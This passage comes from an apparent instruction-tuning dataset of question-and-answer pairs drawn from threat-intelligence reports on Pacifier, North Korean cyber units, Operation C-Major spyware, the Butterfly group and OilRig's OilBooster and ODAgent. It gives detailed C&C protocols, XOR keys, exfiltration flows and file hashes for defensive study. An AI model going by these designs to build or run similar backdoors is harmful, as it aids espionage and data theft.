batch commands. It creates a process with xmlupd.bat but with stderr and stdout redirected to the file %temp%\\1. It waits maximum 30 seconds for it to finish then it will kill the process. After that it sends back to the C&C the content of the %temp%\\1 file. Some examples of commands received:\nsysteminfo\nset\ndir/a %programfiles%\ndir /a %programfiles(x86)%\n\"download\" \u2013 Receives a file and writes it to %temp%. The name of the file is also received from C&C. It will not execute the file.\n\"upload\" \u2013 Receives a file name, reads the file, converts the content to base64 and sends it to the C&C with an extra HTTP header \"File: filename\". If it doesn't find the file it sends back the last error (GetLastError for CreateFileA).\n\"text/html\" \u2013 This looks like a normal Content-Type HTTP header value (the commands arrive in the Content-Type header). When this is received it resets the number of consecutive failed commands and sleeps 28 minutes. The backdoor will continue after.\n\"close\" \u2013 Stops the execution of the backdoor, the injected thread will terminate.\n\"selfdestroy\" \u2013 Deletes the file %temp%\\msvci.dll then ntlm.exe will take care of deleteing all other components. The backdoor ends execution after the command.\n\nHow does the Pacifier APT backdoor ensure persistence and evasion by checking its environment before executing? What specific conditions must be met for the backdoor to run, and how does it handle the absence of these conditions?",
    "output": "The Pacifier APT backdoor ensures persistence and evasion by first checking the internet connection using the CI export from msvct.dll. If it has no internet access, the execution ends. Next, it creates an ID of the infected system as a string such as 'MyCookie: {eceee5c0-1eca-11de-abc9-806d6172696f}{3559831177}' \u2013 the GUID is obtained using GetCurrentHwProfile API and the second bracketed number is the volume serial number. If GetCurrentHwProfile fails, the ID will be 'MyCookie: UserName{3559831177}' \u2013 with the username from GetUserNameA API and again the volume serial number. The ID created will be used to check the connection to the C&C with the CS export from msvct.dll. The connection is checked in an infinite loop with a sleep of 28 minutes after each check, until a valid, active C&C server is found. The C&C addresses are contained in msvct.dll and one of them is returned by CS function on success.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: North Korean cyber war and intelligence structure\nAt the top of North Korea's military structure is the National Defense Commission (NDC). The NDC is also the highest branch of government and the regime's supreme policymaking body. 111 Along with the Central Committee of the Workers' Party of Korea and the Cabinet, NDC is at the top of\nNorth Korea's political hierarchy.112 Article 106 of North Korea's Constitution gives the NDC the following powers:113\n110 http://www.ournation-school.com/\n111 https://nkleadershipwatch.wordpress.com/dprk-security-apparatus/national-defense-commission/\n\uf0b7 The power to establish policies of the state in accordance with the military-first revolutionary line.\n\uf0b7 The power to guide the armed forces and oversee defense building.\n\uf0b7 The power to supervise and ensure the NDC and its chairman's orders are executed and to establish necessary measures.\n\uf0b7 The power to override any state decisions or directives that are in opposition to the NDC or its chairman's decisions and directives.\n\uf0b7 The power to create or remove central organs of the national defense sector.\n\uf0b7 The power to create and bestow military titles above general-grade officer rank.\nThe NDC oversees several defense and intelligence bodies including the Ministry of State Security, the Ministry of People's Security, the Ministry of People's Armed Forces, and the Korean People's Army. The Ministry of State Security (MSS), also known as the State Security Department, is North Korea's primary counterintelligence service. It is considered an autonomous agent of the regime and reports directly to leader Kim Jong Un. The MSS's duties include oversight of North Korean prison camps, investigation of domestic espionage, repatriation of defectors, and overseas counterespionage operations.114 The Ministry of People's Security is also known as the Ministry of Public Security (MPS). Focused on domestic order, it oversees North Korea's national police force, conducts criminal investigations and preliminary examinations, and oversees correctional facilities, excluding prison camps. 115 While the roles of the MSS and MPS focus more on intelligence than on cyber operations, the MSS also reportedly has a communications monitoring and computer hacking group.116\nThe Ministry of People's Armed Forces (MPAF) administrates the Korean People's Army (KPA) and oversees the General Staff Department (GSD), which is responsible for operational command and control of North Korea's armed forces. The General Staff Department also oversees the Reconnaissance General Bureau (RGB), North Korea's agency for clandestine operations. The RGB has a role in both traditional and cyber operations. In the past, the RGB has sent agents on overseas military assistance missions to train insurgent groups. 117 The RGB reportedly has a special operations forces (SOF) element118 and oversees six bureaus that specialize in operations, reconnaissance, technology and cyber matters, overseas intelligence collection, inter-Korean talks, and service support.119 Two of these bureaus have been identified as the No. 91 Office and Unit 121. The No. 91 Office, an office responsible for hacking, operates out of the Mangkyungdae-district of\nUnit 121 comprises both an intelligence component and an attack component. One of Unit 121's command posts is Chilbosan Hotel in Shenyang, China. Unit 121 maintains technical reconnaissance teams responsible for infiltration of computer networks, hacking to obtain intelligence, and planting viruses on enemy networks.\n112 http://whataboutnorthkorea.nl/2013/02/the-korean-workers-party/\n113 http://asiamatters.blogspot.co.uk/2009/10/north-korean-constitution-april-2009.html\n114 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\n115 http://www.factba.se/handbook-page.php?id=1129700\n116 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4\n117 http://www.strategicstudiesinstitute.army.mil/pdffiles/pub771.pdf\n118 http://www.strategicstudiesinstitute.army.mil/pdffiles/pub771.pdf\n119 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\nPyongyang.120 Unit 121 comprises both an intelligence component and an attack component. Unit 121's headquarters is in the Moonshin-dong area of Pyongyang, near the Taedong River.121 It also has components that conduct operations from within China. One of Unit 121's command posts is Chilbosan Hotel122 in Shenyang, the capital of Liaoning Province, which borders North Korea.123 Shenyang is a Chinese military district.124 According to Dr. Alexandre Mansourov, an expert on North Korea and a visiting scholar at the U.S.-Korea Institute at Johns Hopkins University, \"They [Unit 121] are believed to have conducted hacking operations from inside China that falsify classified data and disrupt U.S. and South Korean systems.\"125 Both Unit 121 and an entity known as Lab 110 are reported to maintain technical reconnaissance teams responsible for infiltrating computer networks, hacking to obtain intelligence, and planting viruses on enemy networks.126 127\n120 http://www.infosecisland.com/blogview/21577-Concerns-Mount-over-North-Korean-Cyber-Warfare-Capabilities.html\n121 http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html\n122 http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea\n123 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4\n124 http://www.defense.gov/pubs/2014_DoD_China_Report.pdf\n125 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4\n126 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n127 Clarke, R. A. (2012). Cyber war: The next threat to national security and what to do about it. New York, NY: Ecco.\n128 maps.google.com\nSeveral entities are nested under the Workers' Party. The Central Party Committee oversees the Central Party Investigative Group, also known as Unit 35.130 Unit 35 is reportedly responsible for technical education and training of cyber warriors.131 The Unification Bureau's132 Operations Department is responsible for cyber-psychological warfare, organizational espionage, and oversight of Unit 204. Unit 204's responsibilities include planning and execution of cyber-psychological warfare operations and technological research. The Psychological Operations Department of the North Korea Defense Commission also engages in cyber-psychological warfare.133 The 225th Bureau, or Office 225, is responsible for training agents, infiltration operations in South Korea, and creation of underground political parties in order to incite disorder and revolution. It plays a more traditional intelligence and psychological operations role, rather than focusing on cyber operations.134 The United Front Department (UFD) conducts overt operations to create pro-North Korean groups in South Korea. Examples of this activity include the Korean Asia-Pacific Committee and the Ethnic Reconciliation Council. The UFD also manages inter-Korean dialogue and North Korea's policy toward South Korea. Its operations are also more traditional rather than cyber-focused.135\nThe Unification Bureau falls under the Workers' Party. Its Operations Department is responsible for cyber-psychological warfare, organizational espionage, and oversight of Unit 204. Unit 204's responsibilities include planning and execution of cyber-psychological warfare operations and technological research. The Psychological Operations Department of the North Korea Defense Commission also engages in cyber-psychological warfare.\n129 maps.google.com\n130 Clarke, R. A. (2012). Cyber war: The next threat to national security and what to do about it. New York, NY: Ecco.\n131 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n132 http://goodfriendsusa.blogspot.co.uk/2008/07/north-korea-today-no174.html\n133 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n134 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\n135 http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\nQuestion: How is Unit 121 structured and what are its primary responsibilities within North Korea's cyber warfare framework?",
    "output": "Answer: Unit 121 is a key component of North Korea's cyber warfare capabilities and is part of the Reconnaissance General Bureau (RGB), which is overseen by the General Staff Department. Unit 121 comprises both an intelligence component and an attack component. Its headquarters is located in the Moonshin-dong area of Pyongyang, near the Taedong River. Unit 121 also maintains operations from within China, with one of its command posts being the Chilbosan Hotel in Shenyang, the capital of Liaoning Province. The unit is responsible for infiltrating computer networks, hacking to obtain intelligence, and planting viruses on enemy networks. These activities highlight Unit 121's role in both gathering intelligence and executing offensive cyber operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Link to StealthGenie\nSeveral actors involved in Operation C\u00adMajor have been rather careless in the past, leaving behind numerous digital traces on the Internet. One of these actors has been actively promoting StealthGenie, a spying app for Android, BlackBerry, and iPhone. This app was marketed as a tool one can use to monitor employees, spouses, and children. However, based on its functionalities, it is no different from malicious applications. The Pakistani owner of StealthGenie got by the Federal Bureau of Investigation (FBI) in 2014 for selling spyware and was fined US$500,000.\nFor the C\u00adMajor actor, it was only a small step to go from promoting StealthGenie to using APT malware that was designed to spy on the armed forces of a nation. In 2013, Operation C\u00adMajor used spying apps for BlackBerry phones, which have similar functions to that of StealthGenie's. It was apparent that these apps were developed not for jealous spouses but for the threat actors' intent on stealing sensitive information from organizations like the armed forces.\nBig Headline: More malicious apps\nSince at least early 2013, actors behind Operation C\u00adMajor have been using a variety of malicious apps against high\u00adprofile targets in the Indian military, as well as other foreign embassies. From our research, we saw that these apps were downloaded by the hundreds, most likely by the targets in India. Some of these apps, like fake news apps, are promoted on \"official\" Facebook pages, which is another social engineering trick to lure users into downloading them. Most of these apps are developed by a Pakistani company.\nHere is a rundown of what they used during the operation and how each of them functions:\nMedium Headline: Ringster\nThis spyware collects the contact list of the targets and it can take screenshots of the targets' phones. It\nwas available on Google Play in the first half of 2015 before it was removed.\nOur code analysis reveals that Ringster is reusing a lot of code from Wavecall, a communication tool developed by a company called Yello. Ringster has a hardcoded URL pointing to mpjunkie[.]com. This URL makes a clear connection to the other campaigns of Operation C\u00adMajor, which we described in our .\nMedium Headline: SmeshApp\nSmeshApp is similar to Ringster but is more powerful. Smesh can steal SMS messages, record videos and calls, and send screenshots. Smesh App was available on Google Play from June 2015 till March of 2016, and has been downloaded hundreds of times before it was pulled. This shows that Operation C\u00adMajor used relatively basic malware that remained unnoticed on the Google Play store for a large time window.\nMedium Headline: Indian Sena News and India Defense News Apps\nThree fake news apps, Indian Sena News, Bharatiya Sena News and India Defense News (IDN) were advertised on Facebook. Prior to being closed, the IDN news Facebook page had more than 1,200 likes from Facebook members that have some relation to the India army. Likewise, the Bharatiya Sena News page had 3,300 page likes. These apps are capable of stealing SMS, making videos, recording calls, sending screenshots, and stealing files.\nMedium Headline: BlackBerry malware\nIt is no surprise that the actors behind C\u00adMajor also used BlackBerry malware in their operation. BlackBerry in general has been used a lot by government agencies, probably including the Indian military. As mentioned earlier, the sample we found is spyware for BlackBerry that has similar to StealthGenie's capabilities. It can exfiltrate GPS location, email address, emails, contacts, calendar data, device identifiers, and user's stored photos. The application also has the ability to intercept email, phone calls, MMS, and SMS messages.\nAs far as we know, the BlackBerry malware was never available on BlackBerry World. Most likely social engineering would be needed to get the malware installed on victims' phones.\nBig Headline: Conclusion\nThough the C\u00adMajor operators don't seem to have advanced skills, the damage they potentially have caused is significant. Often their C&C servers live for more than a year and in some cases even several years. They manage to keep malicious apps on Google Play for months and steal significant data from high profile targets before the apps are flagged and removed. As we have previously noted, although C\u00ad\nMajor didn't use advanced malware or exploits, there is no reason why they wouldn't continue to develop themselves to more skilled attackers in the future. With this in mind, we will follow their future activities closely.\nprotects users' Android devices and stops threats before they reach them. (<http://cloudsecurity.trendmicro.com/us/technology-innovation/our-technology/smart-protection-network/>)Trend Micro Mobile Security offers protection and detects these malware using the cloud\u00adbased and Mobile App Reputation technology.\nSHA1s for related files:\nSmesh app\n24f52c5f909d79a70e6e2a4e89aa7816b5f24aec\n202f11c5cf2b9df8bf8ab766a33cd0e6d7a5161a\n31ac19091fd5347568b130d7150ed867ffe38c28\n6919aa3a9d5e193a1d48e05e7bf320d795923ea7\nc48a5d639430e08980f1aeb5af49310692f2701b\n1ce6b3f02fe2e4ee201bdab2c1e4f6bb5a8da1b1\n59aec5002684de8cc8c27f7512ed70c094e4bd20\n552e3a16dd36ae4a3d4480182124a3f6701911f2\nRingster\nc544e5d8c6f38bb199283f11f799da8f3bb3807f\na13568164c0a8f50d76d9ffa6e34e31674a3afc8\nAndrorat\n9288811c9747d151eab4ec708b368fc6cc4e2cb5\n94c74a9e5d1aab18f51487e4e47e5995b7252c4b\ndecf429be7d469292827c3b873f7e61076ffbba1\nf86302da2d38bf60f1ea9549b2e21a34fe655b33\nIndia Sena News\nb142e4b75a4562cdaad5cc2610d31594d2ed17c3\nBlackBerry spyware\nabcb176578df44c2be7173b318abe704963052b2\n16318c4e4f94a5c4018b05955975771637b306b4\n\nWhy was BlackBerry malware used in Operation C-Major, and how did it compare to the Android malware in terms of distribution and capabilities?",
    "output": "BlackBerry malware was used in Operation C-Major because BlackBerry devices were commonly used by government agencies, including the Indian military. The BlackBerry malware had capabilities similar to StealthGenie, allowing it to exfiltrate GPS location, email addresses, emails, contacts, calendar data, device identifiers, and user's stored photos. It could also intercept email, phone calls, MMS, and SMS messages. Unlike the Android malware, the BlackBerry malware was not available on BlackBerry World and likely required social engineering to be installed on victims' phones. This highlights the need for different distribution strategies depending on the platform and target audience.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Butterfly attacks against tech firms\nOn February 1, 2013, Twitter published a blog, stating that it had \"discovered one live attack\" and added that it was \"able to shut it down in process moments later.\" Twitter encouraged users \"to disable Java\" in their browsers. \"The attackers were extremely sophisticated, and we believe other companies and organizations have also been recently similarly attacked,\" said Twitter.\nFourteen days later, on February 15, Facebook issued a statement, disclosing that several of its systems \"had been targeted in a sophisticated attack.\" Facebook said that the attackers used \"a 'zero-day' (previously unseen) exploit to bypass the Java sandbox,\" which had been hosted on a \"mobile developer website that was compromised.\"\nReuters referenced a similar statement from Apple a few days later on February 19. According to Apple, attackers used a Java zero-day exploit to compromise a number of Apple employees' Mac OS X computers. Apple said that the exploit was delivered through a \"site aimed at iPhone developers.\"\nFinally, Microsoft published a statement on February 22, stating that it too had \"experienced a similar security intrusion\" as the ones reported by Facebook and Apple.\nThe attacks against these technology firms appeared to take place between 2012 and early 2013. The zero-day exploit referred to in the various statements took advantage of the Oracle Java Runtime Environment Multiple Remote Code Execution Vulnerabilities (CVE-2013-0422). The vulnerability had been patched by Oracle on January 13, 2013, after the attacks occurred. Various parties published details of the attack vector, as well as the malware used in the attacks, several days later.\nF-Secure blogged that a Mac OS X back door (detected by Symantec as OSX.Pintsized) was the attack's payload. According to the website StopMalvertising, the compromised website that hosted the exploit was an iPhone developer website called iPhoneDevSDK.com.\nIndependent researcher Eric Romang published some technical details about the attacks and established a timeline suggesting that the attackers have been active from September 2012. Symantec telemetry indicates that the timeline goes back even further than this, with malicious activity starting from at least April 2012. Romang analyzed many of the OSX.Pintsized samples and also identified a Windows back door, which he claimed was related to the attacks. This Windows file is a variant of what Symantec detects as Backdoor.Jiripbot. Other vendors called the variant Jripbot.\nSince Romang's analysis, there has been little-to-no public information related to the attackers behind the Java zero-day exploit or the use of OSX.Pintsized and Backdoor.Jiripbot.\nMedium Headline: Victims\nAfter the events of late 2012 and early 2013, the Butterfly attackers appeared to have maintained a low profile, compromising a small number of organizations. Each year however, that number has increased. Symantec has discovered that the Butterfly attackers have compromised 49 unique organizations. Out of the 49 organizations, 27 of the companies' industries could be identified, while the remaining are unknown.\nSome victims seem to have been compromised as a result of collateral damage, as the attackers appeared uninterested in them and either cleaned up or abandoned the infection. However, other victims were clearly of value to Butterfly, as the attackers spread quickly in the networks until they found computers of interest. The chart in Figure 1 shows the number of infected organizations per industry over time. The graph is filtered to only include organizations that could be classified into a sector.\nFigure 1. Number of infected organizations per industry by year\nSymantec found that there was a lull in activity following the very public documentation of the late 2012 and early 2013 attacks. Butterfly's activity resumed in August 2013, and there has been a substantial increase in the number of victims from late 2014 to the present.\nThe three regions that were most heavily targeted by Butterfly since 2012 are shown in Figure 2.\nThe other regions affected by Butterfly's attacks are:\n\u2022 Brazil\n\u2022 China\n\u2022 Hong Kong\n\u2022 India\n\u2022 Israel\n\u2022 Japan\n\u2022 Kazakhstan\n\u2022 Malaysia\n\u2022 Morocco\n\u2022 Nigeria\n\u2022 Taiwan\n\u2022 Thailand\n\u2022 South Korea\n\u2022 United Arab Emirates\nFigure 2. Three regions most heavily targeted by Butterfly attackers\nThe industries of known victims have remained relatively consistent over time, with some notable exceptions.\nMedium Headline: Industries\nThe Java zero-day attack that exploited CVE-2013-0422 appears to have targeted technology companies, judging from the nature of the watering-hole website. This claim is backed up by the organizations that publicly reported how they were compromised in the attacks. Butterfly has continued to target a number of technology companies, which are primarily based in the US.\nOther Butterfly victims of note are involved in the pharmaceutical, legal, and commodities industries. The Butterfly attackers continued to attack these industries intermittently over the following two years.\nSmall Headline: Pharmaceutical\nIn January 2014, a major European pharmaceutical company was compromised. The attackers appear to have first breached a small European office and a month later, spread across the network to the company's US office, as well as the European headquarters.\nTwo more major European pharmaceutical companies were later compromised\u2212one in September 2014 and the other in June 2015. In both incidents, the attackers appear to have gained access to computers in several regional offices. In the June 2015 compromise, the affected company quickly identified the infection from Symantec's alerts, as well as other notifications on Secure Shell (SSH) traffic on non-standard ports.\nSmall Headline: Commodities\nTwo major natural resources organizations were compromised in late 2014. These organizations specifically work with gold and oil. The timing of these compromises, along with the later breach of the law firm as previously mentioned, is notable. It seems very likely that the Butterfly attackers have a specific interest in the commodities industry and are in a position to profit from information stolen from the breached organizations.\nFigure 3. Timeline showing when attacks against different industry sectors began\nMedium Headline: Targeted computers\nThe attackers focused on obtaining access to specific systems of interest in all of the compromised organizations. In most organizations, these systems were email servers: either Microsoft Exchange or Lotus Domino servers. Once the attackers had this access, they presumably then eavesdropped on email conversations and may have been in a position to potentially insert fraudulent emails as well.\nOther systems that the attackers compromised were enterprise content management servers. These systems are used for indexing and storing a company's various documents and other digital assets. Such servers would not contain source code, but rather legal documents, internal policies, training documents, product descriptions, and financial records.\nIn one technology company breach, Butterfly compromised a more unusual system. The attackers gained access to what is known as a Physical Security Information Management (PSIM) system. This software is used for aggregating, managing, and monitoring physical security systems and devices. The physical security systems could consist of CCTV, swipe card access, HVAC, and other building security. After compromised that system, the attackers could have monitored employees through the company's own CCTV systems and tracked the activities of individuals within the building.\nMedium Headline: Tools, tactics, and procedures\nButterfly operates consistently across its breaches, deploying the same set of tools and targeting the same types of computers, which we detail in the Victims section of this report. Butterfly adapts quickly to targeted environments and takes advantage of systems already in place, such as remote access tools or management systems, in order to spread across the network.\nWhile Butterfly has used one confirmed zero-day exploit (CVE-2013-0422), the group appears to have used at least one more zero-day exploit against a vulnerability in Internet Explorer 10.\nBased on our analysis of a command-and-control (C&C) server used in an attack, the Butterfly operators demonstrate exceptional operational security, as they use encrypted virtual machines and multi-staged C&C servers to make it difficult to investigate their activities.\n\nHow did the Butterfly attackers adapt their tactics to spread quickly within the networks of compromised organizations, and what specific systems did they target?",
    "output": "A: The Butterfly attackers adapted quickly to targeted environments and leveraged existing systems such as remote access tools or management systems to spread across the network. They primarily targeted email servers (Microsoft Exchange or Lotus Domino servers) to eavesdrop on email conversations and potentially insert fraudulent emails. Additionally, they compromised enterprise content management servers, which store legal documents, internal policies, training documents, product descriptions, and financial records. In one instance, they even accessed a Physical Security Information Management (PSIM) system to monitor employees through CCTV and track activities within the building.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Downloader loop\nIn the downloader loop, OilBooster repeatedly connects to the shared OneDrive account to  with the .docx and .doc extensions in the victim-specific subdirectory named <victimID>/items/ by sending an HTTP GET request over port 443 to this URL:\ngraph.microsoft.com/v1.0/me/drive/root:/<victimID>/items:/children? $filter=endsWith(name,'.doc')%20or%20endsWith(name,'.docx')&$select=id,name,file\nIf the connection is not successful (the HTTP_STATUS_DENIED response status) after 10 attempts, OilBooster connects to its fallback C&C server, host1[.]com/rt.ovf, to acquire a new refresh token, as discussed earlier.\nAlternatively, if the specified directory does not yet exist (HTTP_STATUS_NOT_FOUND), OilBooster first registers the victim on the shared OneDrive account by sending an HTTP POST request over port 443 to this URL: graph.microsoft.com/v1.0/me/drive/items/root:/<victimID>:/children with the JSON string {\"name\": \"items\",\"folder\":{}} as the request body, as shown in Figure 9. This request creates the whole directory structure <victimID>/items at the same time, which will later be used by the attackers to store commands and additional payloads disguised as .doc and .docx files.\nOn subsequent connections (with HTTP_STATUS_OK), OilBooster processes these files to extract and execute payloads. OilBooster first downloads each file from the OneDrive account and deletes it from OneDrive after processing the file.\nFinally, after going through all the .doc and .docx files downloaded from the OneDrive subdirectory, OilBooster records the last connection timestamp (the current GMT time) by creating a new file named setting.ini in the victim's OneDrive subdirectory, via an HTTP PUT request on port 443 made to this URL: graph.microsoft.com/v1.0/me/drive/root:/<victimID>/setting.ini:/content.\nSmall Headline: Processing .doc files\nFiles with the .doc extension downloaded from the shared OneDrive account are in fact JSON files with encrypted commands to be executed on the compromised host. Once a <filename>.doc is downloaded, OilBooster parses the values named s (part of the decryption key) and c (encrypted command) from the file content. It first base64 decodes, then XOR decrypts the c value, using a key that is created by appending the last two characters of the s value to the last two characters of <filename>.\nAfter decryption, OilBooster executes the command line in a new thread using the CreateProcessW API, and reads the command result via an unnamed pipe connected to the process. OilBooster then uploads the command result to the shared OneDrive account as a new file named <filename>.xls by sending an HTTP PUT request over port 443 to graph.microsoft.com/v1.0/me/drive/root:/<victimID>/items/<filename>.xls:/content.\nSmall Headline: Processing .docx files\nFiles with the .docx extension downloaded from the shared OneDrive account are in fact compressed and encrypted files named <filename>.<original extension>.docx that will be dropped and unpacked on the compromised system. OilBooster first downloads the encrypted file to the local directory named <currentdir>\\items, using the original full filename.\nIn the next step, it reads and decrypts the file content using an XOR cipher with .<original extension> as the decryption key, and drops it in the same directory into a file named <filename>.<original extension>.doc, while the first one is deleted. Finally, OilBooster reads and gzip decompresses the decrypted file, drops the result in the same directory as a file named <filename>.<original extension>, and deletes the other one.\nNote the unnecessary creation of several files in the process \u2013 this is typical for OilRig. We previously described the group's noisy operations on compromised hosts in its (<https://web-assets.esetstatic.com/wls/en/papers/threat-reports/eset_threat_report_t32021.pdf>)Out to Sea campaign.\nBig Headline: Exfiltration loop\nIn the exfiltration thread, OilBooster loops over the contents of the local directory named <currentdir>\\tempFiles, and uploads the file contents to the victim's folder on the shared OneDrive account. Each file is processed in this way:\nOilBooster gzip compresses the original file <filename>.<original extension> and writes the result to a file named <filename>. <original extension>.xlsx in the same directory.\nIt then encrypts the compressed file using an XOR cipher and .<original extension> as the key. If there is no file extension, 4cx is used as the default key.\nFinally, the encrypted file is uploaded to the OneDrive account, and the local file is deleted.\nBig Headline: ODAgent downloader: OilBooster's precursor\nODAgent is a C#/.NET application that uses the Microsoft Graph API to access an attacker-controlled OneDrive account for C&C communication and exfiltration \u2013 in short, ODAgent is loosely a C#/.NET precursor of OilBooster. Similar to OilBooster, ODAgent repeatedly connects to the shared OneDrive account and lists the contents of the victim-specific folder to obtain additional payloads and backdoor commands.\nAs shown in Figure 10, ODAgent then parses the metadata for each remote file. Subsequently, it uses the value of the mimeType key associated with the file to distinguish between backdoor commands (formatted as JSON files) and encrypted payloads \u2013 this is unlike OilBooster, which uses file extensions for that distinction. After processing a file locally, ODAgent deletes the original from the remote OneDrive directory via the OneDrive API.\nIf the downloaded file is a JSON file, ODAgent parses the a1 (command ID), a2 (encrypted backdoor command) and a3 (secret) arguments. It first derives the session key by XORing the provided secret with the hardcoded value 15a49w@]. Then, it base64 decodes and XOR decrypts the backdoor command using this session key. Table 3 lists all backdoor commands supported by ODAgent.\nTable 3. Backdoor commands supported by ODAgent\nOther (non-JSON) files downloaded from the shared OneDrive account are files and additional payloads, both encrypted. ODAgent XOR decrypts these files with the hardcoded key 15a49w@], and drops them in the local <currentdir>\\o directory under the same filename. If the original file has a .c extension, its content is also gzip decompressed (and the extension is then dropped from the filename).\nAt the end of each connection, ODAgent uploads the contents of the local directory <currentdir>\\i to the <victimID>/i directory on the shared OneDrive account, preserving the original filenames with the added .c extension.\nBig Headline: Conclusion\nThroughout 2022, OilRig developed a series of new downloaders, all using a variety of legitimate cloud storage and cloud-based email services as their C&C and exfiltration channels. These downloaders were deployed exclusively against targets in Israel \u2013 often against the same targets within a few months. As all of these targets were previously affected by other OilRig tools, we conclude that OilRig uses this class of lightweight but effective downloaders as its tool of choice to maintain access to networks of interest.\nThese downloaders share similarities with MrPerfectionManager and PowerExchange backdoors, other recent additions to OilRig's toolset that use email-based C&C protocols \u2013 except that SC5k, OilBooster, ODAgent, and OilCheck use attacker-controlled cloud service accounts, rather than the victim's internal infrastructure. All these activities confirm an ongoing switch to legitimate cloud service providers for C&C communication, as a way to hide the malicious communication and mask the group's network infrastructure.\nOn par with the rest of OilRig's toolset, these downloaders are not particularly sophisticated, and are, again, unnecessarily noisy on the system. However, the continuous development and testing of new variants, the experimenting with various cloud services and different programming languages, and the dedication to re-compromise the same targets over and over again, makes OilRig a group to watch out for.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at (<mailto:threatintel@eset.com?utm_source=welivesecurity.com&utm_medium=referral&utm_campaign=autotagging&utm_content=eset-research&utm_term=en>)threatintel@eset.com. (<https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&utm_medium=referral&utm_campaign=wls-research&utm_content=oilrig-persistent-attacks-cloud-service-powered-downloaders>)ESET Research offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page.\n\nQuestion: How does OilBooster handle the situation when it cannot connect to the shared OneDrive account after 10 attempts, and what steps does it take to register a victim if the specified directory does not exist?\n\nAnswer:",
    "output": "When OilBooster cannot connect to the shared OneDrive account after 10 attempts, it connects to its fallback C&C server, host1[.]com/rt.ovf, to acquire a new refresh token. If the specified directory does not exist (HTTP_STATUS_NOT_FOUND), OilBooster registers the victim on the shared OneDrive account by sending an HTTP POST request to create the directory structure <victimID>/items. This structure is later used by the attackers to store commands and additional payloads disguised as .doc and .docx files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: EXECUTIVE SUMMARY\nCompanies now not only face cyber attacks from hacking groups, script kiddies and hactivists, they are also threatened by state-sponsored agencies with limitless resources. These agencies usually carry out cyber attacks to seek a competitive edge, gain access to intellectual property, or for sheer sabotage. In other words, cyber threats have never been more pervasive and attack damages never more real.\nThe situation is especially grim for the Energy and Natural Resources (ENR) industry. The sector is plagued by two key problems. For one, top management has traditionally not placed sufficient emphasis on information security. Also, much more focus is placed on connectivity compared to security. As a result, the ENR sector has become an enticing and relatively easy target for cyber attacks.\nAs evidenced in recent cyber incidents \"Shamoon1\" and \"Night Dragon2\", the resultant loss and combined damage, be it substantial or intellectual, would be far greater than the cost of preventive security measures.\nIn this increasingly insecure environment, senior management should refresh their perspective to safeguard their key corporate assets.\nFor many organisations in the Asia Pacific, a cyber security-oriented structural transformation might be necessary.\n\"I am convinced that there are only two types of companies: those that have been hacked and those that will be. And even they are converging into one category: companies that have been hacked and will be hacked again.\"\nRobert S. Mueller, FBI Director\nRSA Cyber Security Conference March 2012\n1 Shamoon, also known as Disttrack, is a modular computer virus discovered in 2012 that attacks computers running the Microsoft Windows \"NT\" line of operating systems. The virus is being used for cyber espionage in the energy sector. Its discovery was announced on 16 August 2012 by Symantec, Kaspersky Lab, and Seculert.\n2 Operation Night Dragon was a Cyber Attack against energy companies which was exposed by the security company McAfee. Night Dragon attacks are designed to steal sensitive data from targeted organisations. Unlike opportunistic attacks, the perpetrators appear to be sophisticated, highly organised, and motivated in their pursuits.\nBig Headline: An attacker's perspective\nUnderstanding the perspective of an attacker is essential for everyone involved in fighting cybercrime. For that reason, staff in KPMG Netherlands interviewed one of their professionals \u2013 an 'ethical hacker'. He relayed us an intriguing fictitious story. It is up to you to judge how realistic this threat would be to your organisation.\n\"My employer insists on remaining anonymous, but rest assured, he is quite resourceful. He approached me a few weeks ago with a job offer. The goal he set was quite ambitious: steal as many secrets from the government as you can. Let me tell you about the steps I took.\nFirst, I sat down to think about what I knew about the government's IT infrastructure. At a conference last fall, I had met an IT director of a ministry who had told me that all firewalls for the government were supplied by the same vendor, company Y. Hacking such a firewall was a formidable task - not something I was ready to take on directly. Instead, I took a more indirect approach.\nI logged in to LinkedIn and searched for employees of software development companies who mentioned company Y as one of their clients on their LinkedIn profile. Many professionals mention prestigious client names in their profile, even when company policy prohibits name dropping. Shortly after, I found multiple software vendors which make niche software and listed company Y as a client. I visited the vendors' websites\nand scanned their externally reachable IP addresses until I found one which had an unpatched vulnerability in their web server: company X. After a day's work, I was inside their network.\nCompany X is a small organisation and they do not feel they need network segmentation, so I was able to reach all machines on their internal network through that web server. After some more work, I was able to elevate my privileges to domain administrator, which meant I had full access to all of their systems.\nThis was where I hit a bump. I intended to change the source code of their product in such a way that it would allow me to connect remotely to the system of anyone who installed it, but I had never done that before. I then decided to log on to a hacker forum and posted a request for help. I offered 10,000 euros reward for a job well done. After a while, I was approached by someone who was willing to help me. I asked around to confirm his 